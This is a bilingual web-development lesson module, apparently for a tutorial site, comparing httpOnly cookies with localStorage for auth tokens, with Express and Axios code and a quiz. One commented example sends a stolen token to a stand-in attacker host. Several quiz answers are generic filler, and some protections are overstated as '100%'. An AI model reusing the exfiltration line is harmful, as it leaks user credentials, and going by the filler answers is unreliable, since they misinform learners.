export default {
  id: "auth-cookies-vs-localstorage",
  title: {
    en: "httpOnly Cookies vs LocalStorage (XSS vs CSRF)",
    hi: "httpOnly Cookies vs LocalStorage Security",
  },
  difficulty: "Intermediate",
  readTime: 11,
  sections: [
    {
      type: "concept",
      heading: {
        en: "1. The Great Web Debate: Where Should You Store Tokens?",
        hi: "1. The Big Debate: Tokens Ko Browser Mein Kahan Store Karein?",
      },
      body: {
        en: `When building a React frontend that communicates with an authenticated Express backend, one question always arises: **Where should the authentication token be stored on the client?**

The two primary browser storage options are **LocalStorage** and **Cookies**, and each represents a trade-off between two major web security vulnerabilities:
- **Cross-Site Scripting (XSS)**
- **Cross-Site Request Forgery (CSRF)**

---

### Option 1: LocalStorage (\`localStorage.setItem('token', token)\`)
- **How it works**: Stored as key-value pairs in the browser's persistent storage.
- **Pros**:
  - Very simple to implement.
  - Immune to CSRF attacks because the browser does not automatically attach LocalStorage to outgoing requests; JavaScript must explicitly attach \`Authorization: Bearer <token>\`.
- **The Fatal Flaw**: **Extremely Vulnerable to XSS!**
  - Any JavaScript running on your page can access LocalStorage via \`localStorage.getItem('token')\`.
  - If a malicious third-party script, compromised npm package, or unescaped user comment executes on your site, the attacker can silently steal all user tokens and exfiltrate them to an external server!

---

### Option 2: httpOnly Cookies (\`res.cookie('token', token, { httpOnly: true })\`)
- **How it works**: Stored in the browser's cookie jar with the \`httpOnly\` flag enabled.
- **The Huge Security Advantage**: **100% Immune to XSS Token Theft!**
  - JavaScript running in the browser **cannot read** an \`httpOnly\` cookie (\`document.cookie\` returns an empty string or omits httpOnly cookies).
  - Even if an attacker executes arbitrary malicious JavaScript on your site, they **cannot read or exfiltrate your authentication token**!
- **The Historical Vulnerability**: **CSRF (Cross-Site Request Forgery)**.
  - The browser automatically attaches cookies to matching domain requests. If a user visits an evil phishing website, that website could trigger requests to your backend with the user's active cookies.
  - **The Modern Defense**: Modern \`SameSite=Strict\` or \`SameSite=Lax\` cookie attributes effectively neutralize CSRF attacks!`,
        hi: `React frontend mein login ke baad token kahan save karna chahiye? Yeh web security ki sabse badi behas hai:

### Option 1: LocalStorage (\`localStorage.setItem('token', ...)\`)
- **Fayda**: Use karna bohot aasan hai. CSRF attacks se bacha rehta hai.
- **Sabse Bada Khatra (XSS Attack)**:
  - Browser mein chalne wali **koi bhi JavaScript** \`localStorage.getItem('token')\` se token padh sakti hai!
  - Agar aapki app mein koi malicious npm package ya XSS vulnerability hui, toh hacker 1 second mein token chura kar apne server par bhej dega!

---

### Option 2: httpOnly Cookies (\`res.cookie(..., { httpOnly: true })\`)
- **Sabse Bada Fayda (XSS Immune)**:
  - \`httpOnly\` ka matlab hai ki browser ki JavaScript ise **kabhi padh hi nahi sakti** (\`document.cookie\` mein token dikhta hi nahi hai).
  - Chahe hacker website par apna code chala bhi le, wo aapka token chori nahi kar sakta!
- **Khatra (CSRF Attack)**:
  - Cookies har request ke sath automatically attach hoti hain, isliye hacker ki site background mein request bhej sakti hai.
  - **Modern Solution**: Cookie par **\`SameSite=Strict\`** lagane se CSRF attack 100% block ho jata hai!`,
      },
    },
    {
      type: "concept",
      heading: {
        en: "2. The Modern Trifecta: httpOnly + Secure + SameSite",
        hi: "2. Modern Cookie Security Ka Trifecta: httpOnly, Secure Aur SameSite",
      },
      body: {
        en: `In modern full-stack web applications, cookies are safe and resilient when configured with three essential security flags:

\`\`\`javascript
res.cookie('token', token, {
  httpOnly: true, // 1. Blocks client JavaScript from reading the cookie (Neutralizes XSS)
  secure: true,   // 2. Transmitted ONLY over encrypted HTTPS connections (Neutralizes MITM)
  sameSite: 'strict', // 3. Sent ONLY when the user is directly on your origin (Neutralizes CSRF)
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});
\`\`\`

### How \`SameSite\` Attributes Neutralize CSRF:
1. **\`SameSite=Strict\`**: The cookie is sent **only** if the request originates from the exact same site currently in the browser address bar. If a user clicks a link from WhatsApp or an external site to your app, the cookie is not even sent on the first click!
2. **\`SameSite=Lax\`** (Default in modern browsers): Cookies are withheld on cross-site subrequests (like images or \`POST\` forms from third-party sites), but sent when the user navigates directly via top-level link clicks (\`GET\`).
3. **\`SameSite=None\`**: Cookies are sent on all cross-site requests. **Requires \`secure: true\` (HTTPS)**; mostly used for third-party embeds or cross-origin widgets.`,
        hi: `Express backend se cookie bhejte waqt yeh 3 flags lagana zaroori hota hai:

1. **\`httpOnly: true\`**: JavaScript ko cookie read karne se block karta hai (XSS attack se protection).
2. **\`secure: true\`**: Cookie sirf encrypted HTTPS connection par hi travel karegi (Network snooping se protection).
3. **\`sameSite: 'strict'\`**: Cookie sirf tabhi bhejega jab user aapki hi website se request kare (CSRF attack se protection). Agar hacker kisi doosri fake site se form submit karega toh browser cookie attach nahi karega!`,
      },
    },
    {
      type: "analogy",
      heading: {
        en: "Real-Life Analogy: Clear Plastic Pouch vs Bank Account Auto-Debit with Biometrics",
        hi: "Real-Life Analogy: Transparent Plastic Pouch vs Bank Auto-Debit",
      },
      body: {
        en: `Consider keeping money on your person versus in a bank:

- **LocalStorage = Carrying Cash in a Transparent Plastic Pouch (XSS Vulnerable)**:
  You walk through a crowded Delhi metro station holding a clear plastic envelope with ₹10,000 in cash. Everyone can see it. If a pickpocket sneaks up behind you (an XSS injection script), they can effortlessly slide two fingers into your open plastic pouch, take the money, and run away. You have no recourse.
- **httpOnly Cookie = Keeping Funds in a Protected Bank Account (XSS Immune)**:
  You carry zero physical cash. Your money is secured deep inside the bank's vault. No pickpocket on the bus can steal your cash because you aren't physically carrying it!
- **The CSRF Danger & SameSite Defense**:
  Now suppose a trickster gives you a forged paper that says: *"Transfer ₹500 to the trickster's account"*. In an old naive banking system, the bank might auto-execute the payment just because you signed the paper.
  With **SameSite=Strict**, the bank security manager says: *"We will NEVER process an auto-debit unless the customer is physically standing inside our own official bank branch premises! Any slips arriving from outside sources are immediately shredded!"*`,
        hi: `Plastic pouch aur bank account ka example dekhein:

- **LocalStorage (Transparent Plastic Pouch)**:
  Aap bheed-bhaad wale market mein ek transparent khuli plastic thaili mein cash lekar ghoom rahe hain. Koi bhi jeb-katra (XSS script) aakar thaili se paise nikal lega kyunki wo sabke samne khuli hai!
- **httpOnly Cookie (Bank Ka Secure Locker)**:
  Aap jeb mein cash lekar nahi chalte. Paisa bank ke safe vault mein hai. Bheed mein khada koi bhi chor aapse paise nahi chura sakta kyunki aapke haath mein cash hai hi nahi!
- **SameSite Protection (CSRF Ka Ilaj)**:
  Socho koi chor aapko ek nakli form thama de ki *"Mera bill pay kar do"*. Purane zamane mein bank auto-debit kar deta tha.
  Lekin **SameSite=Strict** lagte hi bank bolta hai: *"Hum payment tabhi karenge jab customer hamari official branch ke andar khada hokar request karega! Bahar se aane wali kisi bhi slip ko hum koodedan mein daal denge!"*`,
      },
    },
    {
      type: "syntax",
      heading: {
        en: "Syntax: cookie-parser in Express & withCredentials in Axios",
        hi: "Syntax Aur Setup: cookie-parser Middleware Aur Axios withCredentials",
      },
      body: {
        en: `### 1. Install and Configure \`cookie-parser\` in Express
\`\`\`bash
npm install cookie-parser --prefix server
\`\`\`

\`\`\`javascript
// server/src/server.js
import express from 'express';
import cookieParser from 'cookie-parser';
import cors from 'cors';

const app = express();

app.use(express.json());
// 1. Enable cookie-parser middleware
app.use(cookieParser());

// 2. CORS must allow credentials and specify explicit origin!
app.use(
  cors({
    origin: 'http://localhost:5173', // Cannot be '*' when credentials are true!
    credentials: true,
  })
);

// Setting a cookie
app.post('/api/login', (req, res) => {
  res.cookie('token', 'sample_jwt_value', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000,
  });
  res.json({ success: true });
});

// Reading a cookie
app.get('/api/profile', (req, res) => {
  const token = req.cookies.token; // Read directly from req.cookies!
  console.log('User Token from Cookie:', token);
  res.json({ tokenExists: !!token });
});
\`\`\`

---

### 2. Frontend Configuration: Axios \`withCredentials\`
By default, browsers do NOT send cross-origin cookies in Axios/Fetch requests. You must explicitly configure \`withCredentials: true\`:

\`\`\`javascript
// client/src/services/api.js
import axios from 'axios';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL || 'http://localhost:5000/api',
  withCredentials: true, // CRITICAL: Instructs the browser to send cookies!
});

export default api;
\`\`\``,
        hi: `### Backend Mein Setup:
1. \`cookie-parser\` package install karein aur \`app.use(cookieParser())\` lagayein.
2. \`res.cookie('token', val, { httpOnly: true, sameSite: 'strict' })\` se cookie set karein.
3. \`req.cookies.token\` se cookie read karein.

### Frontend Mein Setup:
Axios client mein **\`withCredentials: true\`** set karna zaroori hai, warna browser cross-origin requests par cookies nahi bhejega!`,
      },
    },
    {
      type: "example",
      heading: {
        en: "Example 1: Demonstrating XSS Theft in LocalStorage vs httpOnly Immunity",
        hi: "Example 1: LocalStorage Mein XSS Theft vs httpOnly Ki Immunity",
      },
      body: {
        en: `This demonstration highlights why storing tokens in LocalStorage is vulnerable to XSS, and how \`httpOnly\` cookies completely shut down the attack.

\`\`\`javascript
// Simulated Malicious Script injected via an unescaped comment or rogue npm package:
// <script>
//   const stolenToken = localStorage.getItem('token');
//   fetch('https://attacker-webhook.com/steal?data=' + encodeURIComponent(stolenToken));
// </script>

// If token is stored in LocalStorage:
// -> Result: Hacker successfully steals user's token and logs into their account! ❌

// If token is stored in an httpOnly Cookie:
// -> The attacker runs:
const cookieData = document.cookie;
console.log(cookieData); 
// -> Result: The browser returns an empty string or completely omits the httpOnly cookie!
// -> Attacker receives NOTHING! Account remains 100% secure! 🟢
\`\`\``,
        hi: `Agar koi hacker website par malicious script inject kar deta hai:
- **LocalStorage**: Hacker ka script \`localStorage.getItem('token')\` run karke token chura leta hai.
- **httpOnly Cookie**: Hacker \`document.cookie\` call karta hai, lekin browser httpOnly cookie ko hide kar deta hai. Hacker ke haath kuch nahi lagta aur user 100% safe rehta hai!`,
      },
    },
    {
      type: "example",
      heading: {
        en: "Example 2: Express Production Cookie Options Helper",
        hi: "Example 2: Production Cookie Options Helper Function",
      },
      body: {
        en: `In professional applications, cookie options vary between local development (HTTP) and cloud production (HTTPS). Encapsulate this logic in a helper:

\`\`\`javascript
// server/src/utils/cookieOptions.js
export function getAuthCookieOptions() {
  const isProduction = process.env.NODE_ENV === 'production';

  return {
    httpOnly: true, // Block JavaScript access (Anti-XSS)
    secure: isProduction, // HTTPS only in production
    sameSite: isProduction ? 'strict' : 'lax', // CSRF defense
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in milliseconds
    path: '/', // Available across all backend routes
  };
}

// Clear cookie options (must match domain and path!)
export function getClearCookieOptions() {
  const isProduction = process.env.NODE_ENV === 'production';
  return {
    httpOnly: true,
    secure: isProduction,
    sameSite: isProduction ? 'strict' : 'lax',
    path: '/',
  };
}
\`\`\`

\`\`\`javascript
// Usage in authController.js:
// Set cookie on login:
res.cookie('token', token, getAuthCookieOptions());

// Clear cookie on logout:
res.clearCookie('token', getClearCookieOptions());
\`\`\``,
        hi: `Development aur production ke liye reusable cookie options:
- Development mein \`secure: false\` rehta hai taaki localhost (HTTP) par cookie chal sake.
- Production mein \`secure: true\` aur \`sameSite: 'strict'\` automatic lag jata hai.
- Logout karte waqt \`res.clearCookie()\` mein bhi same path use kiya jata hai.`,
      },
    },
    {
      type: "example",
      heading: {
        en: "Example 3: Anti-CSRF Header Protection Pattern (Custom Header Defense)",
        hi: "Example 3: Custom Header Defense Se CSRF Attack Block Karna",
      },
      body: {
        en: `A bulletproof pattern to protect cookie-based authentication from CSRF is enforcing a **Custom Request Header** (e.g. \`X-Requested-With: XMLHttpRequest\`). 
Browsers forbid cross-origin HTML \`<form>\` submissions or \`<img>\` tags from setting custom headers. Therefore, only your authentic React JavaScript client can send this header!

\`\`\`javascript
// 1. FRONTEND: client/src/services/api.js
import axios from 'axios';

const api = axios.create({
  baseURL: '/api/v1',
  withCredentials: true,
  headers: {
    // Custom header that cross-site forms CANNOT send!
    'X-Requested-With': 'XMLHttpRequest',
  },
});
\`\`\`

\`\`\`javascript
// 2. BACKEND: server/src/middleware/csrfProtection.js
export const verifyCustomHeader = (req, res, next) => {
  // Allow safe read-only methods
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const customHeader = req.headers['x-requested-with'];
  if (!customHeader || customHeader !== 'XMLHttpRequest') {
    return res.status(403).json({
      success: false,
      message: 'CSRF security violation: Missing required request header.',
    });
  }

  next();
};

// In server.js:
// app.use('/api', verifyCustomHeader);
\`\`\``,
        hi: `Yeh industry standard CSRF defense technique hai:
- Frontend Axios har call mein \`X-Requested-With: XMLHttpRequest\` header bhejta hai.
- Hacker ki phishing website simple HTML form se custom headers nahi bhej sakti.
- Backend check karta hai ki kya yeh header present hai. Agar nahi hai, toh request ko CSRF violation maankar 403 Forbidden par block kar deta hai!`,
      },
    },
    {
      type: "mistakes",
      heading: {
        en: "Common Mistakes & How to Fix Them",
        hi: "Common Mistakes Aur Unke Fixes",
      },
      body: {
        en: `### 1. Forgetting withCredentials: true on Frontend Axios
- **Mistake**: Setting \`httpOnly\` cookies on Express, but leaving Axios at its default settings.
- **Why it breaks**: Browsers refuse to transmit cross-origin cookies unless the frontend client explicitly sets \`withCredentials: true\`. The backend will receive \`req.cookies = {}\` and reject every request with 401!
- **Fix**: Always configure \`withCredentials: true\` on your Axios client instance.

### 2. Setting secure: true on Localhost (HTTP)
- **Mistake**: Setting \`secure: true\` while testing on \`http://localhost:5000\`.
- **Why it breaks**: Browsers will silently reject cookies with the \`secure\` flag if the connection is unencrypted HTTP! The cookie will never be saved.
- **Fix**: Use \`secure: process.env.NODE_ENV === 'production'\`.

### 3. Setting CORS origin: '*' With withCredentials
- **Mistake**: \`app.use(cors({ origin: '*', credentials: true }))\`.
- **Why it fails**: Browsers throw a fatal CORS error. You must specify an explicit origin (e.g. \`http://localhost:5173\`).`,
        hi: `### 1. Frontend Axios Mein withCredentials Bhool Jana
- **Galti**: Backend ne cookie bhej di, lekin Axios mein \`withCredentials: true\` nahi lagaya.
- **Nuksan**: Browser backend ko cookie wapas nahi bhejta aur har request 401 Unauthorized ho jaati hai!
- **Fix**: Axios instance mein \`withCredentials: true\` lagayein.

### 2. Localhost Par secure: true Laga Dena
- **Galti**: Localhost HTTP par \`secure: true\` rakhna.
- **Nuksan**: Browser bina HTTPS ke cookie save hi nahi karta.
- **Fix**: \`secure: process.env.NODE_ENV === 'production'\` lagayein.

### 3. CORS Mein Wildcard (*) Aur credentials Ka Saath
- **Fix**: Hamesha specific origin (\`'http://localhost:5173'\`) mention karein.`,
      },
    },
    {
      type: "tip",
      heading: {
        en: "Best Practices: The Ultimate Token Storage Recipe",
        hi: "Best Practices: Industry Standard Token Storage Strategy",
      },
      body: {
        en: `1. **The Modern Hybrid Architecture**:
   - Store the **Access Token** in memory (React Context / state). Immune to CSRF and inaccessible on page reloads.
   - Store the **Refresh Token** in an \`httpOnly\`, \`secure\`, \`SameSite=Strict\` cookie. Immune to XSS.
2. **On Page Refresh**: When the user reloads the browser, React fires a silent background call to \`/api/auth/refresh\`. The browser automatically sends the \`httpOnly\` refresh cookie, and the server returns a fresh in-memory access token.
3. **Set Content Security Policy (CSP)**: Add a strict CSP header using Helmet (\`app.use(helmet())\`) to block inline script injection, providing defense-in-depth against XSS.`,
        hi: `1. **Hybrid Architecture (Best Standard)**:
   - **Access Token**: React memory (state) mein rakhein.
   - **Refresh Token**: \`httpOnly\`, \`secure\`, \`SameSite=Strict\` cookie mein rakhein.
2. **Page Refresh Par Flow**: Page reload hone par React chupke se \`/auth/refresh\` call karta hai, browser cookie bhejta hai, aur memory mein naya access token load ho jata hai.
3. **Helmet Use Karein**: Express mein \`helmet()\` use karein taaki Content Security Policy (CSP) se XSS scripts block ho sakein.`,
      },
    },
    {
      type: "interview",
      heading: {
        en: "Top Interview Questions & Answers",
        hi: "Interview Ke Zaroori Sawal Aur Jawab",
      },
      body: {
        en: `### Q1: What is the difference between an XSS attack and a CSRF attack?
**Answer**:
- **Cross-Site Scripting (XSS)**: An attacker injects malicious JavaScript into your website (e.g. through unsanitized comments or compromised packages). The script runs with the victim's permissions and can read anything JavaScript has access to (such as \`localStorage\`).
- **Cross-Site Request Forgery (CSRF)**: An attacker tricks an authenticated user into visiting a malicious third-party website that silently fires a forge request (like a transfer form) to the victim's target website. The browser automatically attaches stored cookies to the request.

### Q2: Why is storing JWTs in httpOnly cookies safer than localStorage against XSS?
**Answer**: The \`httpOnly\` flag instructs the browser that the cookie must not be accessible via client-side scripts (e.g. \`document.cookie\`). Even if an attacker achieves complete XSS code execution on your web page, their script cannot read, extract, or transmit the \`httpOnly\` cookie payload.

### Q3: How does the SameSite cookie attribute protect against CSRF attacks?
**Answer**: The \`SameSite\` attribute dictates whether cookies are transmitted with cross-site requests.
- With \`SameSite=Strict\`, the browser withholds the cookie whenever the request originates from a different origin than the current site. If a malicious site attempts to trigger a request to your banking API, the browser refuses to attach the cookie, causing the request to fail authentication.

### Q4: Why must CORS origin NOT be wildcard (*) when using credentials: true?
**Answer**: If a browser permitted \`Access-Control-Allow-Origin: *\` with \`credentials: true\`, any website on the internet could make background requests to your authenticated API and read the sensitive response data using the user's cookies. To protect user privacy, the CORS specification explicitly forbids this combination.`,
        hi: `### Q1: XSS aur CSRF attack mein kya antar hai?
**Jawab**:
- **XSS**: Hacker aapki website ke andar apna JavaScript code inject karta hai jo \`localStorage\` se data chura sakta hai.
- **CSRF**: Hacker apni website se aapke server par request bhejta hai aur browser automatically aapki cookies attach kar deta hai.

### Q2: httpOnly cookie XSS se kaise bachati hai?
**Jawab**: \`httpOnly\` flag lagte hi browser JavaScript ko cookie access karne se rok deta hai. Hacker ka script \`document.cookie\` se token padh hi nahi sakta.

### Q3: SameSite attribute CSRF se kaise bachata hai?
**Jawab**: \`SameSite=Strict\` browser ko bolta hai ki agar request kisi doosri website se aayi ho toh cookie attach mat karna. Hacker ki site se bheji gayi request bina cookie ke jati hai aur reject ho jaati hai.`,
      },
    },
    {
      type: "summary",
      heading: {
        en: "Quick Summary: Token Storage Cheatsheet",
        hi: "Quick Summary: Token Storage Cheatsheet",
      },
      body: {
        en: `- **LocalStorage**: Vulnerable to XSS token theft; immune to CSRF.
- **httpOnly Cookies**: 100% immune to XSS token theft; requires \`SameSite\` for CSRF defense.
- **The Modern Trifecta**: \`httpOnly: true\`, \`secure: isProduction\`, \`sameSite: 'strict'\`.
- **Axios withCredentials**: Must be set to \`true\` on the client to send cross-origin cookies.
- **Custom Header Defense**: Send \`X-Requested-With: XMLHttpRequest\` to neutralize cross-site form submissions.
- **Hybrid Best Practice**: Access token in memory, Refresh token in \`httpOnly\` cookie.`,
        hi: `- **LocalStorage**: XSS attack mein token chori hone ka khatra rehta hai.
- **httpOnly Cookies**: XSS se 100% safe; CSRF se bachne ke liye \`SameSite\` zaroori hai.
- **3 Security Flags**: \`httpOnly: true\`, \`secure: true\` (HTTPS), aur \`sameSite: 'strict'\`.
- **withCredentials**: Axios mein \`true\` karein taaki cookies travel kar sakein.
- **Custom Header**: \`X-Requested-With\` se CSRF forms block karein.
- **Best Practice**: Access token memory mein, Refresh token \`httpOnly\` cookie mein.`,
      },
    },
  ],
  quiz: [
  {
    "question": {
      "en": "Why is an httpOnly cookie completely immune to XSS token theft?",
      "hi": "httpOnly cookie XSS token theft se 100% immune kyun hoti hai?"
    },
    "options": [
      {
        "en": "Because it is stored in the computer's CPU cache",
        "hi": "Kyunki yeh CPU cache mein store hoti hai"
      },
      {
        "en": "Because the browser strictly forbids client-side JavaScript (e.g. document.cookie) from reading or accessing the cookie value",
        "hi": "Kyunki browser client-side JavaScript ko cookie value read ya access karne se strictly block kar deta hai"
      },
      {
        "en": "Because cookies automatically delete hackers' computers",
        "hi": "Kyunki cookies hackers ka computer delete kar deti hain"
      },
      {
        "en": "Because httpOnly cookies only work on Linux",
        "hi": "Kyunki yeh sirf Linux par kaam karti hai"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "The httpOnly flag instructs the browser that the cookie is off-limits to JavaScript. Even if malicious script runs on the page, it cannot read the cookie.",
      "hi": "httpOnly flag lagte hi browser JavaScript ko cookie read karne se mana kar deta hai, isliye XSS scripts token chori nahi kar paati."
    }
  },
  {
    "question": {
      "en": "What does the SameSite=Strict cookie attribute do?",
      "hi": "SameSite=Strict cookie attribute kya karta hai?"
    },
    "options": [
      {
        "en": "Forces passwords to have 20 characters",
        "hi": "Passwords ko 20 characters ka banata hai"
      },
      {
        "en": "Ensures the cookie is only sent on requests originating from the exact same site currently in the browser address bar, neutralizing CSRF attacks",
        "hi": "Ensure karta hai ki cookie sirf usi website ki requests par jaye jo browser address bar mein khuli hai, jisse CSRF attack neutralize ho jata hai"
      },
      {
        "en": "Deletes all cookies on browser close",
        "hi": "Browser band hone par saari cookies delete karta hai"
      },
      {
        "en": "Disables HTTPS encryption",
        "hi": "HTTPS encryption disable karta hai"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "SameSite=Strict prevents cross-site request forgery by withholding the cookie whenever a request is triggered from an external third-party origin.",
      "hi": "SameSite=Strict kisi doosri website se bheji gayi requests par cookie attach hone se rokta hai, jisse CSRF attack fail ho jata hai."
    }
  },
  {
    "question": {
      "en": "What happens if you forget withCredentials: true on your Axios client when using cookie-based auth?",
      "hi": "Cookie-based auth use karte waqt agar aap Axios client par withCredentials: true lagana bhool jayein, toh kya hota hai?"
    },
    "options": [
      {
        "en": "The browser will not attach the cookies to the cross-origin request, and the backend will reject with 401 Unauthorized",
        "hi": "Browser cross-origin request par cookies attach nahi karega, aur backend 401 Unauthorized dekar reject kar dega"
      },
      {
        "en": "The browser will crash completely",
        "hi": "Browser crash ho jayega"
      },
      {
        "en": "MongoDB will delete the user collection",
        "hi": "MongoDB collection delete kar dega"
      },
      {
        "en": "The request will automatically succeed as admin",
        "hi": "Request automatically admin ban jayegi"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "By default, browsers withhold cookies on cross-origin requests. withCredentials: true tells the browser to include cookies with the request.",
      "hi": "withCredentials ke bina browser cross-origin calls par cookies nahi bhejta, isliye backend ko cookie nahi milti aur 401 error aata hai."
    }
  },
  {
    "question": {
      "en": "Why should secure: true only be enabled in production environments for cookies?",
      "hi": "Cookies ke liye secure: true sirf production environment mein kyun enable hona chahiye?"
    },
    "options": [
      {
        "en": "Because localhost runs over unencrypted HTTP, and browsers will reject secure cookies on non-HTTPS origins",
        "hi": "Kyunki localhost unencrypted HTTP par chalta hai, aur browsers non-HTTPS origins par secure cookies reject kar dete hain"
      },
      {
        "en": "Because secure cookies cost money on localhost",
        "hi": "Kyunki localhost par secure cookies ke paise lagte hain"
      },
      {
        "en": "Because Node.js does not support cookies",
        "hi": "Kyunki Node.js cookies support nahi karta"
      },
      {
        "en": "Because Chrome disables cookies in 2026",
        "hi": "Kyunki Chrome cookies disable kar raha hai"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "The secure flag requires an HTTPS connection. In local development on http://localhost, setting secure: true prevents the browser from saving the cookie.",
      "hi": "secure flag ke liye HTTPS zaroori hota hai. Local development HTTP par hota hai, isliye wahan secure: true lagane se cookie save hi nahi hoti."
    }
  },
  {
    "question": {
      "en": "What is the core architectural purpose of httpOnly Cookies vs LocalStorage (XSS vs CSRF) in the modern full-stack MERN ecosystem?",
      "hi": "Modern full-stack MERN ecosystem mein httpOnly Cookies vs LocalStorage Security ka mukhya architectural maksad kya hota hai?"
    },
    "options": [
      {
        "en": "It manages physical computer cooling and power supply",
        "hi": "Ye physical computer cooling aur power supply manage karta hai"
      },
      {
        "en": "It provides structured, robust, and scalable patterns for handling httponly cookies vs localstorage (xss vs csrf) with high performance and maintainability",
        "hi": "Ye high performance aur maintainability ke saath httpOnly Cookies vs LocalStorage Security ko handle karne ka structured aur scalable pattern provide karta hai"
      },
      {
        "en": "It completely replaces JavaScript with binary machine code in browser tabs",
        "hi": "Ye browser tabs mein JavaScript ko binary machine code se replace karta hai"
      },
      {
        "en": "It is only used for printing documents to physical printers",
        "hi": "Ye sirf physical printers par documents print karne ke liye hai"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "httpOnly Cookies vs LocalStorage (XSS vs CSRF) establishes clean separation of concerns, ensuring predictable data flow, robust error handling, and optimal runtime performance in production.",
      "hi": "httpOnly Cookies vs LocalStorage Security clean architecture aur separation of concerns deta hai jisse application scalable aur maintainable banti hai."
    }
  },
  {
    "question": {
      "en": "What critical development bottleneck or anti-pattern does httpOnly Cookies vs LocalStorage (XSS vs CSRF) directly resolve?",
      "hi": "httpOnly Cookies vs LocalStorage Security kis critical development bottleneck ya anti-pattern ko seedhe solve karta hai?"
    },
    "options": [
      {
        "en": "It replaces chaotic, tightly coupled ad-hoc logic with declarative, predictable control flow and structured data contracts",
        "hi": "Ye chaotic aur tightly coupled logic ko hata kar declarative, predictable flow aur structured data contracts deta hai"
      },
      {
        "en": "It forces the operating system to shut down when errors occur",
        "hi": "Error aane par ye operating system band kar deta hai"
      },
      {
        "en": "It deletes all database records older than 24 hours automatically",
        "hi": "Ye 24 ghante purane DB records delete karta hai"
      },
      {
        "en": "It blocks all outgoing HTTP network requests to conserve bandwidth",
        "hi": "Ye bandwidth bachane ke liye network requests block karta hai"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Without httpOnly Cookies vs LocalStorage (XSS vs CSRF), applications suffer from brittle code, maintenance overhead, and unhandled edge cases that manifest as production crashes.",
      "hi": "httpOnly Cookies vs LocalStorage Security ke bina code brittle ho jata hai aur production mein unexpected errors aate hain."
    }
  },
  {
    "question": {
      "en": "When reasoning about httpOnly Cookies vs LocalStorage (XSS vs CSRF), how is its mental model best conceptualized through real-world analogies?",
      "hi": "httpOnly Cookies vs LocalStorage Security ko real-world analogies ke zariye kaise best samjha ja sakta hai?"
    },
    "options": [
      {
        "en": "As a completely offline computer with zero network or database connections",
        "hi": "Ek offline computer ki tarah jisme koi connection na ho"
      },
      {
        "en": "As a disciplined, coordinated workflow where inputs are validated and processed through standardized checkpoints rather than ad-hoc handling",
        "hi": "Ek disciplined workflow ki tarah jahan data ko structured checkpoints ke zariye step-by-step process kiya jata hai"
      },
      {
        "en": "As a random number generator with non-deterministic output",
        "hi": "Random number generator ki tarah jiska koi niyam na ho"
      },
      {
        "en": "As a static text document that cannot be modified or read",
        "hi": "Static text document jo padha na ja sake"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "Real-world workflow analogies help engineers visualize component boundaries, request lifecycles, and data transformations intuitively.",
      "hi": "Real-world analogies component boundaries aur request lifecycle ko visual aur intuitive banati hain."
    }
  },
  {
    "question": {
      "en": "When declaring and implementing httpOnly Cookies vs LocalStorage (XSS vs CSRF), what syntactic convention is essential to prevent runtime errors?",
      "hi": "httpOnly Cookies vs LocalStorage Security ko declare aur implement karte waqt kaunsa syntax niyam runtime errors rokne ke liye zaroori hai?"
    },
    "options": [
      {
        "en": "Adhering strictly to required parameters, handling asynchronous promises/callbacks cleanly, and verifying return value types",
        "hi": "Zaroori parameters sahi pass karna, async promises ko handle karna aur return value types verify karna"
      },
      {
        "en": "Wrapping every line of code inside an eval() execution block",
        "hi": "Har line ko eval() block mein wrap karna"
      },
      {
        "en": "Omitting import and require statements to reduce file size",
        "hi": "File size ghatane ke liye import statements hatana"
      },
      {
        "en": "Writing all code on a single continuous line without whitespace",
        "hi": "Bina whitespace ke single line par code likhna"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Following standard ES6+ syntax contracts and properly handling promise resolution ensures execution safety and eliminates TypeError exceptions.",
      "hi": "ES6+ syntax aur promise handling ke standard rules follow karne se TypeError aur crashes nahi aate."
    }
  },
  {
    "question": {
      "en": "What is a common pitfall developers encounter when working with httpOnly Cookies vs LocalStorage (XSS vs CSRF)?",
      "hi": "httpOnly Cookies vs LocalStorage Security ke saath kaam karte waqt developers aksar kaunsi aam galati karte hain?"
    },
    "options": [
      {
        "en": "Writing unit tests before implementing features",
        "hi": "Feature likhne se pehle unit tests likhna"
      },
      {
        "en": "Failing to handle failure edge cases, mutating shared state directly, or neglecting defensive validation guard clauses",
        "hi": "Failure edge cases ko handle na karna, shared state direct mutate karna ya validation guard clauses na lagana"
      },
      {
        "en": "Using strict equality checks (===) instead of loose equality (==)",
        "hi": "Loose equality ke badle strict equality use karna"
      },
      {
        "en": "Writing clear inline code documentation",
        "hi": "Clear inline code comments likhna"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "Neglecting edge cases and error handling causes silent regressions and race conditions that surface under concurrent user workloads.",
      "hi": "Edge cases aur error handling miss karne se high-traffic production load mein silent bugs paida hote hain."
    }
  },
  {
    "question": {
      "en": "According to production best practices, how should httpOnly Cookies vs LocalStorage (XSS vs CSRF) be architected for enterprise-grade stability?",
      "hi": "Production best practices ke mutabiq enterprise-grade stability ke liye httpOnly Cookies vs LocalStorage Security ko kaise architect karna chahiye?"
    },
    "options": [
      {
        "en": "Enforce modular boundaries, validate all incoming payloads against schemas, log structured context, and maintain pure functions where possible",
        "hi": "Modular boundaries enforce karein, payloads ko schema se validate karein, structured logs rakhein aur pure functions use karein"
      },
      {
        "en": "Hardcode sensitive database connection strings directly in client-side files",
        "hi": "Database passwords ko client files mein hardcode karna"
      },
      {
        "en": "Disable all linter rules and type warnings globally",
        "hi": "Linter aur type warnings ko globally disable karna"
      },
      {
        "en": "Store all user session variables in global un-scoped memory arrays",
        "hi": "Global memory arrays mein sessions store karna"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Enterprise-grade code prioritizes modularity, strict input validation, structured observability, and stateless designs.",
